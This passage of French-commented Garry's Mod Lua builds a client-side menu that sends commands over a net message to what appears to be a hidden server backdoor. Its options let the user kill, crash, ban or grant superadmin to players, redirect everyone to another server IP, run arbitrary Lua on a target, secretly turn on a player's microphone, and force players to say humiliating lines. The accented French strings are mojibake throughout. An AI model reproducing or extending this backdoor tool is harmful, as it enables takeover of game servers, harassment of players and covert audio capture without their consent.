		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animationallsubdance:AddOption( "1 fois", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("animation_dance")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animationallsubdance:AddOption( "en boucle", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("animation_dance_loop")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animationall:AddOption( "STOP ALL", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("stop_timer_animation")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

ulxall:AddOption( "Unban ALL ", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("unbanall")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/status_online.png" )

ulxall:AddOption( "Give une arme", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "weapon_rpg" )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("itemsall")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/bomb.png" ) 

ulxall:AddOption( "Changer les models", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "models/editor/playerstart.mdl" )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("modelall")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/box.png" )

ulxall:AddOption( "Rediriger tous les joueurs vers une ip", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "127.0.0.1:27015" )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("redirectplayer")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/server_go.png" )

m:AddSpacer() -- Add a spacer
m:Open() -- Show our menu
end
local AppList = vgui.Create( "DListView", Frame )
AppList:SetMultiSelect( false )
AppList:AddColumn( "Utilisateur" )
AppList:SetSize( ScrW() -400, ScrH() -400 );
AppList:SetPos( 100, 80 );
			for k, v in pairs(player.GetAll()) do
				AppList:AddLine( v:Nick() .. "     " .. v:GetUserGroup(), v)
			end
AppList.OnRowSelected = function( lst, index, pnl )
userl = pnl:GetColumnText( 2 )
valuess = pnl:GetColumnText( 1 )
local m = DermaMenu()
local meutre, meutreicon = m:AddSubMenu( "Meutre" )
meutreicon:SetIcon( "icon16/bomb.png" )
m:AddSpacer()
local ulx, ulxicon = m:AddSubMenu( "Commandes" )
ulxicon:SetIcon( "icon16/script_edit.png" )
m:AddSpacer()
local visuel, visuelicon = m:AddSubMenu( "Visuel" )
visuelicon:SetIcon( "icon16/eye.png" )
m:AddSpacer()
local soundboard, soundboardlicon = m:AddSubMenu( "SoundBoard" )
soundboardlicon:SetIcon( "icon16/sound.png" )
m:AddSpacer()
local tpsub, tpsubicon = m:AddSubMenu( "TÃƒÂ©lÃƒÂ©portation" )
tpsubicon:SetIcon( "icon16/user_go.png" )
local tpsubgmconstruct, tpsubgmconstructicon = tpsub:AddSubMenu( "GM_CONSTRUCT" )
tpsubgmconstructicon:SetIcon( "icon16/map.png" )
local tpsubgmflat, tpsubgmflaticon = tpsub:AddSubMenu( "GM_FLATGRASS" )
tpsubgmflaticon:SetIcon( "icon16/map.png" )
local tpsubglife3, tpsubglife3icon = tpsub:AddSubMenu( "RP_GLIFE_ROCKFORD3" )
tpsubglife3icon:SetIcon( "icon16/map.png" )
local downtownv4cv2, downtownv4cv2icon = tpsub:AddSubMenu( "RP_ROCKFORD_V2B" )
downtownv4cv2icon:SetIcon( "icon16/map.png" )
local ulxsubgrade, ulxsubgradeicon = ulx:AddSubMenu( "Grades" )
ulxsubgradeicon:SetIcon( "icon16/user.png" )
local ulxsubgod, ulxsubgodicon = ulx:AddSubMenu( "Mode dieu" )
ulxsubgodicon:SetIcon( "icon16/heart.png" )
local ulxsubfreeze, ulxsubfreezeicon = ulx:AddSubMenu( "Freeze" )
ulxsubfreezeicon:SetIcon( "icon16/heart.png" )
local ulxsubnoclip, ulxsubnoclipicon = ulx:AddSubMenu( "NOCLIP" )
ulxsubnoclipicon:SetIcon( "icon16/drive_user.png" )
m:AddSpacer()
local animation, animationicon = m:AddSubMenu( "Animation" )
animationicon:SetIcon( "icon16/wand.png" )
m:AddSpacer()
local mooves, moovesicon = m:AddSubMenu( "Mouvement" )
moovesicon:SetIcon( "icon16/controller.png" )
m:AddSpacer()
local troll, trollicon = m:AddSubMenu( "Troll Menu" )
trollicon:SetIcon( "icon16/rainbow.png" )
local trollsubflash, trollsubflashicon = troll:AddSubMenu( "Flashlight SPAM" )
trollsubflashicon:SetIcon( "icon16/lightbulb_off.png" )
local trollsubscreen, trollsubscreenicon = troll:AddSubMenu( "Screenshot SPAM" )
trollsubscreenicon:SetIcon( "icon16/camera.png" )
local trollsubstopsound, trollsubstopsoundicon = troll:AddSubMenu( "Stopsound SPAM" )
trollsubstopsoundicon:SetIcon( "icon16/sound_mute.png" )
local trollsubmoooves, trollsubmooovesicon = troll:AddSubMenu( "Mouvement" )
trollsubmooovesicon:SetIcon( "icon16/bug_error.png" )
local trollsubgravity, trollsubgravityicon = troll:AddSubMenu( "GravitÃƒÂ© Casser" )
trollsubgravityicon:SetIcon( "icon16/star.png" )
local trollsubjumpc, trollsubjumpcicon = troll:AddSubMenu( "Jump Casser" )
trollsubjumpcicon:SetIcon( "icon16/star.png" )
local trollsubmic, trollsubmicicon = troll:AddSubMenu( "Micro" )
trollsubmicicon:SetIcon( "icon16/sound.png" )
local trollprison, trollprisonicon = troll:AddSubMenu( "Prison" )
trollprisonicon:SetIcon( "icon16/user_orange.png" )
m:AddSpacer()
meutre:AddOption( "Tuer la personne", function() 
	 net.Start( "echangeinfo" )
	 net.WriteString("killuser")
	 net.WriteEntity( userl )
	 net.SendToServer()
	 actioneff("Vous venez de tuer " .. userl:Nick())
end ):SetIcon( "icon16/delete.png" )
meutre:AddOption( "Tuer la personne (silencieux)", function() 
	 net.Start( "echangeinfo" )
	 net.WriteString("killusersilence")
	 net.WriteEntity( userl )
	 net.SendToServer()
	 actioneff("Vous venez de tuer " .. userl:Nick())
end ):SetIcon( "icon16/delete.png" )
meutre:AddOption( "Bruler la personne", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("fireuser")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez de bruler " .. userl:Nick())
 end ):SetIcon( "icon16/delete.png" )

meutre:AddOption( "Exploser la personne", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("exploseuser")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez d'exploser " .. userl:Nick())
 end ):SetIcon( "icon16/delete.png" )

ulxsubgrade:AddOption( "[SUPERADMIN]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("superadmin")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez de passer " .. userl:Nick() .. " [superadmin]")
end ):SetIcon( "icon16/user_add.png" )

ulxsubgrade:AddOption( "[USER]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("userrank")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez de passer " .. userl:Nick() .. " [user]")
end ):SetIcon( "icon16/user_delete.png" )

ulxsubgrade:AddOption( "[CUSTOM]", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame )
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "vip" )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("custom")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/user_delete.png" ) 

ulxsubnoclip:AddOption( "[ON]", function() 
	 net.Start( "echangeinfo" )
	 net.WriteString("noclipon")
	 net.WriteEntity( userl )
	 net.SendToServer()
 end ):SetIcon( "icon16/accept.png" )

ulxsubnoclip:AddOption( "[OFF]", function() 
	 net.Start( "echangeinfo" )
	 net.WriteString("noclipoff")
	 net.WriteEntity( userl )
	 net.SendToServer()
end ):SetIcon( "icon16/cancel.png" )

ulx:AddOption( "Donner de l'argent", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "500" )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("addmoney")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/money_add.png" ) 

ulx:AddOption( "Point de Vie", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "100" )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("pvheal")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/heart.png" )

ulx:AddOption( "Point d'armure", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "250" )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("armorpv")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/user_suit.png" )

troll:AddOption( "Launch", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("launchuser")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous d'envoyer " .. userl:Nick() .. " dans les airs")
end ):SetIcon( "icon16/arrow_up.png" )

ulx:AddOption( "Meurtre au RPG", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("lockdown")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/clock_red.png" )

troll:AddOption( "2D Players", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("2dplayeruser")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/arrow_up.png" )

troll:AddOption( "Donner la grosse tÃƒÂªte", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("grosseteteuser")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/bug.png" )

troll:AddOption( "Changer la taille du joueur", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "5" )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("scaleuser")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/application_edit.png" )

troll:AddOption( "Faire crash le joueur", function() 
	 net.Start( "echangeinfo" )
	 net.WriteString("crashuser")
	 net.WriteEntity( userl )
	 net.SendToServer()
	 actioneff(userl:Nick() .. " vient de crash")
end ) :SetIcon( "icon16/disconnect.png" )

troll:AddOption( "Hurlement", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("hurlementuser")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez d'hurler sur " .. userl:Nick())
end ):SetIcon( "icon16/bell.png" )

trollsubflash:AddOption( "[ON]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("flashon")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/accept.png" )

trollsubflash:AddOption( "[OFF]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("flashoff")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/cancel.png" )

trollsubscreen:AddOption( "[ON]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("screenon")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/accept.png" )

trollsubscreen:AddOption( "[OFF]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("screenoff")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/cancel.png" ) 

trollsubstopsound:AddOption( "[ON]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("stopsoundon")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/accept.png" )

trollsubstopsound:AddOption( "[OFF]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("stopsoundoff")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/cancel.png" ) 

trollsubmoooves:AddOption( "[ON]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("moovetroll")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff(userl:Nick().." vient de perdre le contrÃƒÂ´le")
end ):SetIcon( "icon16/accept.png" )

trollsubmoooves:AddOption( "[OFF]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("unmoovetroll")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff(userl:Nick().." vient de reprendre le contrÃƒÂ´le")
end ):SetIcon( "icon16/cancel.png" )

trollsubgravity:AddOption( "[ON]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("cassergr")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez de casser la gravitÃƒÂ© de " .. userl:Nick())
end ):SetIcon( "icon16/accept.png" )

trollsubgravity:AddOption( "[OFF]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("retablirgr")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez de rÃƒÂ©tablir la gravitÃƒÂ© Ãƒ  " .. userl:Nick())
end ):SetIcon( "icon16/cancel.png" )

trollsubjumpc:AddOption( "[ON]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("jumpuser")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez de casser la gravitÃƒÂ© des sauts de " .. userl:Nick())
end ):SetIcon( "icon16/accept.png" )

trollsubjumpc:AddOption( "[OFF]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("retablirjumpuser")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez de rÃƒÂ©tablir la gravitÃƒÂ© des sauts de " .. userl:Nick())
end ):SetIcon( "icon16/cancel.png" )

troll:AddOption( "Black Screen", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("blackscreen")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez d'enlever la vue Ãƒ  " .. userl:Nick())
end ):SetIcon( "icon16/contrast.png" )

troll:AddOption( "Imitation", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "/ooc Je suis un soumis." )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("imitation")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/application_edit.png" )

trollsubmic:AddOption( "[ON]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("micon")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous avez activer le micro de " .. userl:Nick() )
end ):SetIcon( "icon16/accept.png" )

trollsubmic:AddOption( "[OFF]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("micoff")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous avez dÃƒÂ©sactiver le micro de " .. userl:Nick() )
end ):SetIcon( "icon16/cancel.png" )

troll:AddOption( "Changer le model", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "models/editor/playerstart.mdl" )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("setmodel")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/box.png" )

troll:AddOption( "Send LUA", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "Lua Code" )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("sendluauser")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/application_xp_terminal.png" )


visuel:AddOption( "Visuel John", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("johnsound")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/application_xp_terminal.png" )

soundboard:AddOption( "SoundBoard Lien", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "Lua Code" )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("soundboard")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/application_xp_terminal.png" )

ulxsubgod:AddOption( "[ON]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("goduseron")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez de mettre en mode dieu " .. userl:Nick())
 end ):SetIcon( "icon16/heart_add.png" ) 
ulxsubgod:AddOption( "[OFF]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("goduseroff")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez d'enlever de mode dieu " .. userl:Nick())
 end ):SetIcon( "icon16/heart_delete.png" ) 
ulx:AddOption( "Give une arme", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "weapon_rpg" )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("items")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/bomb.png" ) 

ulx:AddOption( "Kick", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "Raison..." )
TextEntry.OnEnter = function( self )
		 net.Start( "echangeinfo" )
		 net.WriteString("kickuser")
		 net.WriteEntity( userl )
		 net.WriteString(TextEntry:GetValue())
		 net.SendToServer()
end
end ):SetIcon( "icon16/status_away.png" )

ulx:AddOption( "Ban", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("banuser")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez de ban " .. userl:Nick())
end ):SetIcon( "icon16/status_busy.png" ) 

ulx:AddOption( "BanIP", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("banipuser")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez de banIP " .. userl:Nick())
end ):SetIcon( "icon16/status_busy.png" ) 

ulxsubfreeze:AddOption( "[ON]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("freezeuser")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez de freeze " .. userl:Nick())
end ):SetIcon( "icon16/accept.png" )

ulxsubfreeze:AddOption( "[OFF]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("unfreezeuser")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez de unfreeze " .. userl:Nick())
end ):SetIcon( "icon16/cancel.png" ) 

ulx:AddOption( "Unjail", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("unjailall")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/bomb.png" )

ulx:AddOption( "Stripweapon", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("strip")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez d'enlever les armes de " .. userl:Nick() )
end ):SetIcon( "icon16/bomb.png" )

ulx:AddOption( "Context De Combat", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("contextfucker")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vient d'obtenir le pouvoir de vie et de mort ")
end ):SetIcon( "icon16/bomb.png" )

tpsubgmconstruct:AddOption( "Spawn", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("gm_construct_spawn")
		 net.WriteEntity( userl )
		 net.SendToServer()
end )

tpsubgmconstruct:AddOption( "Building NÃ‚Â°1 [DerniÃƒÂ¨re ÃƒÂ©tage]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("gm_construct_building_roof0")
		 net.WriteEntity( userl )
		 net.SendToServer()
end )

tpsubgmconstruct:AddOption( "Building NÃ‚Â°1 [Toit]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("gm_construct_building_roof1")
		 net.WriteEntity( userl )
		 net.SendToServer()
end )

tpsubgmconstruct:AddOption( "Building NÃ‚Â°2 [DerniÃƒÂ¨re ÃƒÂ©tage]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("gm_construct_building2_roof1")
		 net.WriteEntity( userl )
		 net.SendToServer()
end )

tpsubgmconstruct:AddOption( "Building NÃ‚Â°2 [Toit]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("gm_construct_building2_roof0")
		 net.WriteEntity( userl )
		 net.SendToServer()
end )

tpsubgmconstruct:AddOption( "Building NÃ‚Â°3 [Toit]", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("gm_construct_building3_roof0")
		 net.WriteEntity( userl )
		 net.SendToServer()
end )


tpsubgmconstruct:AddOption( "Sous-Sol", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("gm_construct_down")
		 net.WriteEntity( userl )
		 net.SendToServer()
end )

tpsubgmconstruct:AddOption( "Secret Room", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("gm_construct_secret")
		 net.WriteEntity( userl )
		 net.SendToServer()
end )
tpsubgmconstruct:AddOption( "Skybox", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("gm_construct_skybox")
		 net.WriteEntity( userl )
		 net.SendToServer()
end )

tpsubgmflat:AddOption( "Secret Room", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("gm_flat_secret")
		 net.WriteEntity( userl )
		 net.SendToServer()
end )

tpsubglife3:AddOption( "Grue", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("glife3_grue")
		 net.WriteEntity( userl )
		 net.SendToServer()
end )

tpsubglife3:AddOption( "Water tower", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("glife3_water_tower")
		 net.WriteEntity( userl )
		 net.SendToServer()
end )

tpsubglife3:AddOption( "Bank Vault", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("glife3_coffre")
		 net.WriteEntity( userl )
		 net.SendToServer()
end )

tpsubglife3:AddOption( "Secret Room", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("glife3_secret")
		 net.WriteEntity( userl )
		 net.SendToServer()
end )

downtownv4cv2:AddOption( "Spawn", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("rp_rockford_v2b_spawn")
		 net.WriteEntity( userl )
		 net.SendToServer()
end )

animation:AddOption( "Saluer", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("animation_salute_user")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animation:AddOption( "Robot", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("animation_robot_user")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animation:AddOption( "Levez les mains", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("animation_cheer_user")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animation:AddOption( "Rire", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("animation_laugh_user")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animation:AddOption( "Danse sexy", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("animation_muscle_user")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animation:AddOption( "Faire le beau", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("animation_persistence_user")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animation:AddOption( "Dance", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("animation_dance_user")
		 net.WriteEntity( userl )
		 net.SendToServer()
end ):SetIcon( "icon16/bell.png" )


mooves:AddOption( "[ON]Avancer", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("forwardmoove")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez de faire avancer " .. userl:Nick() )
end ):SetIcon( "icon16/accept.png" )

mooves:AddOption( "[OFF]Avancer", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("unforwardmoove")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez d'arrÃƒÂªter de faire avancer " .. userl:Nick() )
end ):SetIcon( "icon16/stop.png" )

mooves:AddOption( "[ON]Reculer", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("backmoove")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez de faire reculer " .. userl:Nick() )
end ):SetIcon( "icon16/accept.png" )

mooves:AddOption( "[OFF]Reculer", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("unbackmoove")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez d'arrÃƒÂªter de faire reculer " .. userl:Nick() )
end ):SetIcon( "icon16/stop.png" )

mooves:AddOption( "[ON]Tourner Ãƒ  gauche", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("leftmoove")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez de faire touner Ãƒ  gauche " .. userl:Nick() )
end ):SetIcon( "icon16/accept.png" )

mooves:AddOption( "[OFF]Tourner Ãƒ  gauche", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("unleftmoove")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez d'arrÃƒÂªter de faire touner Ãƒ  gauche " .. userl:Nick() )
end ):SetIcon( "icon16/stop.png" )

mooves:AddOption( "[ON]Tourner Ãƒ  droite", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("rightmoove")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez d'arrÃƒÂªter de faire touner Ãƒ  droite " .. userl:Nick() )
end ):SetIcon( "icon16/accept.png" )

mooves:AddOption( "[OFF]Tourner Ãƒ  droite", function() 
		 net.Start( "echangeinfo" )
		 net.WriteString("unrightmoove")
		 net.WriteEntity( userl )
		 net.SendToServer()
		 actioneff("Vous venez d'arrÃƒÂªter de faire touner Ãƒ  gauche " .. userl:Nick() )
